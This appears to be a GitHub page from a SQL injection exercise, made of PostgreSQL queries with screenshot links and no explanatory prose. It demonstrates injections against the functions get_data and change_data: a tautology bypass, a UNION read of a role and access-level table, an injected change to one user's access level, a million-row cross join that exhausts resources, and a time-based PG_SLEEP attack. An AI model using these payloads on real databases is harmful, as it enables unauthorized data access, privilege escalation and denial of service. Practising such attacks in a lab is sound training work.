SELECT * FROM get_data('1'' OR 1=1 -- ');

<img width="481" alt="image" src="https://user-images.githubusercontent.com/27497026/210150550-89b24445-9670-41d4-b344-15b31c276bff.png">

SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FROM role_access_level -- ');

<img width="570" alt="image" src="https://user-images.githubusercontent.com/27497026/210150560-58b69220-21f9-4420-9589-ae7c1398e167.png">

SELECT * FROM change_data('1'' OR role_name = ''ruslan'' -- ', 3);

<img width="564" alt="image" src="https://user-images.githubusercontent.com/27497026/210150587-bc71bba2-6ea7-4c09-8635-9eea28090242.png">

SELECT * FROM get_data('1'' UNION
(SELECT p1, CAST(p1 AS VARCHAR), CAST(p1 AS INTEGER)
FROM (SELECT generate_series p1 FROM generate_series (1,1000)) t1
CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- ');

<img width="552" alt="image" src="https://user-images.githubusercontent.com/27497026/210150618-8d3e7543-236e-455d-ba01-36c1018af258.png">

SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');

<img width="568" alt="image" src="https://user-images.githubusercontent.com/27497026/210150627-528acd77-f92d-47f5-b4f3-4b534677687f.png">

